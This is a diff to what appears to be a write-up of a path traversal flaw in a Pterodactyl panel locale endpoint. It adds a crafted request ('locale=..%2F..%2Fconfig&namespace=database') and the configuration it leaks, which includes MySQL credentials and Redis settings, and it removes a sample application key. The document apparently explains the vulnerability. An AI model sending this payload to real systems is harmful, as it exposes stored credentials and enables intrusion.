@@ -212,10 +212,64 @@ GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1
 ```
 
 ```
-"key": "base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=",
-"cipher": "AES-256-CBC",
+GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=database HTTP/1.1
 
-base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
-
-
+{
+  "../../config": {
+    "database": {
+      "default": "mysql",
+      "connections": {
+        "mysql": {
+          "driver": "mysql",
+          "url": "",
+          "host": "127.0.0.1",
+          "port": "3306",
+          "database": "panel",
+          "username": "pterodactyl",
+          "password": "PteraPanel",
+          "unix_socket": "",
+          "charset": "utf8mb4",
+          "collation": "utf8mb4_unicode_ci",
+          "prefix": "",
+          "prefix_indexes": "1",
+          "strict": "",
+          "timezone": "+00{{00}}",
+          "sslmode": "prefer",
+          "options": {
+            "1014": "1"
+          }
+        }
+      },
+      "migrations": "migrations",
+      "redis": {
+        "client": "predis",
+        "options": {
+          "cluster": "redis",
+          "prefix": "pterodactyl_database_"
+        },
+        "default": {
+          "scheme": "tcp",
+          "path": "/run/redis/redis.sock",
+          "host": "127.0.0.1",
+          "username": "",
+          "password": "",
+          "port": "6379",
+          "database": "0",
+          "context": []
+        },
+        "sessions": {
+          "scheme": "tcp",
+          "path": "/run/redis/redis.sock",
+          "host": "127.0.0.1",
+          "username": "",
+          "password": "",
+          "port": "6379",
+          "database": "1",
+          "context": []
+        }
+      }
+    }
+  }
+}
 ```
+
